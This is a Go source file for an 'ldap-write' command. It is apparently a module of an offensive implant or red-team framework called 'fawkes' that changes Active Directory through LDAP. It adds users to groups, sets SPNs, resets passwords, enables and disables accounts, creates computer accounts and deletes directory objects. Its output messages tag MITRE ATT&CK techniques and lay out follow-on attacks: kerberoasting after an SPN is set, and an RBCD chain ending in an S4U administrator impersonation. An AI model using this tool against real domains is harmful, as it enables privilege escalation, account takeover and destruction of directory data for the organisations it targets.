package commands

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
)

type LdapWriteCommand struct{}

func (c *LdapWriteCommand) Name() string        { return "ldap-write" }
func (c *LdapWriteCommand) Description() string {
	return "Modify Active Directory objects via LDAP"
}

type ldapWriteArgs struct {
	Action   string   `json:"action"`
	Server   string   `json:"server"`
	Port     int      `json:"port"`
	Username string   `json:"username"`
	Password string   `json:"password"`
	BaseDN   string   `json:"base_dn"`
	UseTLS   bool     `json:"use_tls"`
	Target   string   `json:"target"`
	Group    string   `json:"group"`
	Attr     string   `json:"attr"`
	Value    string   `json:"value"`
	Values   []string `json:"values"`
}

func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
	allActions := "add-member, remove-member, set-attr, add-attr, remove-attr, set-spn, disable, enable, set-password, add-computer, delete-object"
	if task.Params == "" {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: parameters required. Use -action <%s> -server <DC>", allActions),
			Status:    "error",
			Completed: true,
		}
	}

	var args ldapWriteArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Server == "" {
		return structs.CommandResult{
			Output:    "Error: server parameter required (domain controller IP or hostname)",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Port <= 0 {
		if args.UseTLS {
			args.Port = 636
		} else {
			args.Port = 389
		}
	}

	// Validate action before connecting
	action := strings.ToLower(args.Action)
	validActions := map[string]bool{
		"add-member": true, "remove-member": true,
		"set-attr": true, "add-attr": true, "remove-attr": true,
		"set-spn": true, "disable": true, "enable": true, "set-password": true,
		"add-computer": true, "delete-object": true,
	}
	if !validActions[action] {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: %s", args.Action, allActions),
			Status:    "error",
			Completed: true,
		}
	}

	// set-password requires LDAPS
	if action == "set-password" && !args.UseTLS {
		return structs.CommandResult{
			Output:    "Error: set-password requires LDAPS (-use_tls true). AD rejects password changes over unencrypted LDAP.",
			Status:    "error",
			Completed: true,
		}
	}

	// Connect
	conn, err := ldapConnect(ldapQueryArgs{
		Server: args.Server, Port: args.Port, UseTLS: args.UseTLS,
		Username: args.Username, Password: args.Password,
	})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to LDAP server %s:%d: %v", args.Server, args.Port, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer conn.Close()

	// Bind
	if err := ldapBind(conn, ldapQueryArgs{Username: args.Username, Password: args.Password}); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error binding to LDAP: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Determine base DN
	baseDN := args.BaseDN
	if baseDN == "" {
		baseDN, err = detectBaseDN(conn)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error detecting base DN: %v. Specify -base_dn manually.", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	switch strings.ToLower(args.Action) {
	case "add-member":
		return ldapAddMember(conn, args, baseDN)
	case "remove-member":
		return ldapRemoveMember(conn, args, baseDN)
	case "set-attr":
		return ldapSetAttr(conn, args, baseDN)
	case "add-attr":
		return ldapAddAttr(conn, args, baseDN)
	case "remove-attr":
		return ldapRemoveAttr(conn, args, baseDN)
	case "set-spn":
		return ldapSetSPN(conn, args, baseDN)
	case "disable":
		return ldapToggleAccount(conn, args, baseDN, true)
	case "enable":
		return ldapToggleAccount(conn, args, baseDN, false)
	case "set-password":
		return ldapSetPassword(conn, args, baseDN)
	case "add-computer":
		return ldapAddComputer(conn, args, baseDN)
	case "delete-object":
		return ldapDeleteObject(conn, args, baseDN)
	default:
		// Unreachable — action is validated before connection
		return structs.CommandResult{Output: "Unknown action", Status: "error", Completed: true}
	}
}

// ldapResolveDN resolves a sAMAccountName to its full distinguished name.
func ldapResolveDN(conn *ldap.Conn, name string, baseDN string) (string, error) {
	// If it's already a DN, return as-is
	if strings.Contains(name, "=") {
		return name, nil
	}

	// Search for the object by sAMAccountName
	searchRequest := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		1, 10, false,
		fmt.Sprintf("(sAMAccountName=%s)", ldap.EscapeFilter(name)),
		[]string{"distinguishedName"},
		nil,
	)

	result, err := conn.Search(searchRequest)
	if err != nil {
		return "", fmt.Errorf("search failed: %v", err)
	}

	if len(result.Entries) == 0 {
		// Try CN search as fallback
		searchRequest = ldap.NewSearchRequest(
			baseDN,
			ldap.ScopeWholeSubtree,
			ldap.NeverDerefAliases,
			1, 10, false,
			fmt.Sprintf("(cn=%s)", ldap.EscapeFilter(name)),
			[]string{"distinguishedName"},
			nil,
		)
		result, err = conn.Search(searchRequest)
		if err != nil || len(result.Entries) == 0 {
			return "", fmt.Errorf("object '%s' not found", name)
		}
	}

	return result.Entries[0].DN, nil
}

func ldapAddMember(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Group == "" {
		return structs.CommandResult{
			Output:    "Error: -target (user/computer to add) and -group (group name) are required",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	groupDN, err := ldapResolveDN(conn, args.Group, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving group: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	modReq := ldap.NewModifyRequest(groupDN, nil)
	modReq.Add("member", []string{targetDN})

	if err := conn.Modify(modReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error adding member: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] LDAP Group Membership Modification (T1098)\n"+
			"[+] Added:  %s\n"+
			"[+] To:     %s\n"+
			"[+] Server: %s\n", targetDN, groupDN, args.Server),
		Status:    "success",
		Completed: true,
	}
}

func ldapRemoveMember(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Group == "" {
		return structs.CommandResult{
			Output:    "Error: -target (user/computer to remove) and -group (group name) are required",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	groupDN, err := ldapResolveDN(conn, args.Group, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving group: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	modReq := ldap.NewModifyRequest(groupDN, nil)
	modReq.Delete("member", []string{targetDN})

	if err := conn.Modify(modReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error removing member: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] LDAP Group Membership Modification (T1098)\n"+
			"[+] Removed: %s\n"+
			"[+] From:    %s\n"+
			"[+] Server:  %s\n", targetDN, groupDN, args.Server),
		Status:    "success",
		Completed: true,
	}
}

func ldapSetAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Attr == "" {
		return structs.CommandResult{
			Output:    "Error: -target (object to modify) and -attr (attribute name) are required",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	values := args.Values
	if len(values) == 0 && args.Value != "" {
		values = []string{args.Value}
	}
	modReq.Replace(args.Attr, values)

	if err := conn.Modify(modReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error setting attribute: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	valDisplay := args.Value
	if len(args.Values) > 0 {
		valDisplay = strings.Join(args.Values, ", ")
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] LDAP Attribute Modification (T1098)\n"+
			"[+] Target:    %s\n"+
			"[+] Attribute: %s\n"+
			"[+] Value:     %s\n"+
			"[+] Operation: REPLACE\n"+
			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server),
		Status:    "success",
		Completed: true,
	}
}

func ldapAddAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Attr == "" {
		return structs.CommandResult{
			Output:    "Error: -target (object to modify) and -attr (attribute name) are required",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	values := args.Values
	if len(values) == 0 && args.Value != "" {
		values = []string{args.Value}
	}
	modReq.Add(args.Attr, values)

	if err := conn.Modify(modReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error adding attribute value: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	valDisplay := args.Value
	if len(args.Values) > 0 {
		valDisplay = strings.Join(args.Values, ", ")
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] LDAP Attribute Modification (T1098)\n"+
			"[+] Target:    %s\n"+
			"[+] Attribute: %s\n"+
			"[+] Value:     %s\n"+
			"[+] Operation: ADD\n"+
			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server),
		Status:    "success",
		Completed: true,
	}
}

func ldapRemoveAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Attr == "" {
		return structs.CommandResult{
			Output:    "Error: -target (object to modify) and -attr (attribute name) are required",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	values := args.Values
	if len(values) == 0 && args.Value != "" {
		values = []string{args.Value}
	}
	modReq.Delete(args.Attr, values)

	if err := conn.Modify(modReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error removing attribute value: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	valDisplay := args.Value
	if len(args.Values) > 0 {
		valDisplay = strings.Join(args.Values, ", ")
	}
	if valDisplay == "" {
		valDisplay = "(all values)"
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] LDAP Attribute Modification (T1098)\n"+
			"[+] Target:    %s\n"+
			"[+] Attribute: %s\n"+
			"[+] Value:     %s\n"+
			"[+] Operation: DELETE\n"+
			"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server),
		Status:    "success",
		Completed: true,
	}
}

func ldapSetSPN(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Value == "" {
		return structs.CommandResult{
			Output:    "Error: -target (account) and -value (SPN, e.g. MSSQLSvc/host.domain.local) are required",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Add("servicePrincipalName", []string{args.Value})

	if err := conn.Modify(modReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error setting SPN: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] LDAP SPN Modification (T1134)\n"+
			"[+] Target: %s\n"+
			"[+] SPN:    %s\n"+
			"[+] Server: %s\n"+
			"\n[!] Account is now kerberoastable — use kerberoast to extract TGS hash.\n",
			targetDN, args.Value, args.Server),
		Status:    "success",
		Completed: true,
	}
}

func ldapToggleAccount(conn *ldap.Conn, args ldapWriteArgs, baseDN string, disable bool) structs.CommandResult {
	if args.Target == "" {
		return structs.CommandResult{
			Output:    "Error: -target (account to disable/enable) is required",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Read current userAccountControl
	searchReq := ldap.NewSearchRequest(
		targetDN,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		1, 10, false,
		"(objectClass=*)",
		[]string{"userAccountControl"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil || len(result.Entries) == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading userAccountControl: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	uacStr := result.Entries[0].GetAttributeValue("userAccountControl")
	uac, _ := strconv.Atoi(uacStr)

	const accountDisable = 0x0002
	var newUAC int
	var actionStr string

	if disable {
		newUAC = uac | accountDisable
		actionStr = "Disabled"
	} else {
		newUAC = uac &^ accountDisable
		actionStr = "Enabled"
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("userAccountControl", []string{fmt.Sprintf("%d", newUAC)})

	if err := conn.Modify(modReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error modifying userAccountControl: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] LDAP Account Control Modification (T1098)\n"+
			"[+] Target: %s\n"+
			"[+] Action: %s\n"+
			"[+] UAC:    0x%04X → 0x%04X\n"+
			"[+] Server: %s\n", targetDN, actionStr, uac, newUAC, args.Server),
		Status:    "success",
		Completed: true,
	}
}

func ldapSetPassword(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Value == "" {
		return structs.CommandResult{
			Output:    "Error: -target (account) and -value (new password) are required. Requires LDAPS.",
			Status:    "error",
			Completed: true,
		}
	}

	if !args.UseTLS {
		return structs.CommandResult{
			Output:    "Error: set-password requires LDAPS (-use_tls true). AD rejects password changes over unencrypted LDAP.",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// AD password format: UTF-16LE encoded, surrounded by double quotes
	quotedPwd := "\"" + args.Value + "\""
	utf16Pwd := make([]byte, len(quotedPwd)*2)
	for i, c := range quotedPwd {
		utf16Pwd[i*2] = byte(c)
		utf16Pwd[i*2+1] = 0
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("unicodePwd", []string{string(utf16Pwd)})

	if err := conn.Modify(modReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error setting password: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] LDAP Password Change (T1098)\n"+
			"[+] Target:   %s\n"+
			"[+] Password: (set successfully)\n"+
			"[+] Server:   %s\n", targetDN, args.Server),
		Status:    "success",
		Completed: true,
	}
}

func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return structs.CommandResult{
			Output:    "Error: -target (computer name, without trailing $) is required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Value == "" {
		return structs.CommandResult{
			Output:    "Error: -value (password for the computer account) is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Normalize: ensure sAMAccountName ends with $
	samName := args.Target
	if !strings.HasSuffix(samName, "$") {
		samName = samName + "$"
	}

	// Computer DN goes in the default Computers container
	computerDN := fmt.Sprintf("CN=%s,CN=Computers,%s", args.Target, baseDN)

	// Encode password as UTF-16LE with surrounding quotes (AD unicodePwd format)
	quotedPwd := "\"" + args.Value + "\""
	utf16Pwd := make([]byte, len(quotedPwd)*2)
	for i, c := range quotedPwd {
		utf16Pwd[i*2] = byte(c)
		utf16Pwd[i*2+1] = 0
	}

	// WORKSTATION_TRUST_ACCOUNT = 0x1000 (4096)
	const workstationTrustAccount = "4096"

	addReq := ldap.NewAddRequest(computerDN, nil)
	addReq.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user", "computer"})
	addReq.Attribute("cn", []string{args.Target})
	addReq.Attribute("sAMAccountName", []string{samName})
	addReq.Attribute("userAccountControl", []string{workstationTrustAccount})
	addReq.Attribute("unicodePwd", []string{string(utf16Pwd)})

	// Set DNS hostname if we can infer the domain
	dnsParts := strings.Split(baseDN, ",")
	var domainParts []string
	for _, part := range dnsParts {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(strings.ToUpper(part), "DC=") {
			domainParts = append(domainParts, part[3:])
		}
	}
	if len(domainParts) > 0 {
		fqdn := strings.ToLower(args.Target) + "." + strings.Join(domainParts, ".")
		addReq.Attribute("dNSHostName", []string{fqdn})
	}

	if err := conn.Add(addReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating computer account: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] LDAP Computer Account Creation (T1136.002)\n"+
			"[+] DN:            %s\n"+
			"[+] sAMAccountName: %s\n"+
			"[+] Password:      (set)\n"+
			"[+] UAC:           WORKSTATION_TRUST_ACCOUNT (0x1000)\n"+
			"[+] Server:        %s\n"+
			"\n[!] Use with RBCD: ldap-write -action set-attr -target <victim> -attr msDS-AllowedToActOnBehalfOfOtherIdentity ...\n"+
			"[!] Then: ticket -action s4u -target <victim> -impersonate administrator\n",
			computerDN, samName, args.Server),
		Status:    "success",
		Completed: true,
	}
}

func ldapDeleteObject(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" {
		return structs.CommandResult{
			Output:    "Error: -target (object to delete — sAMAccountName, CN, or full DN) is required",
			Status:    "error",
			Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving target: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	delReq := ldap.NewDelRequest(targetDN, nil)
	if err := conn.Del(delReq); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error deleting object: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] LDAP Object Deletion\n"+
			"[+] Deleted: %s\n"+
			"[+] Server:  %s\n", targetDN, args.Server),
		Status:    "success",
		Completed: true,
	}
}
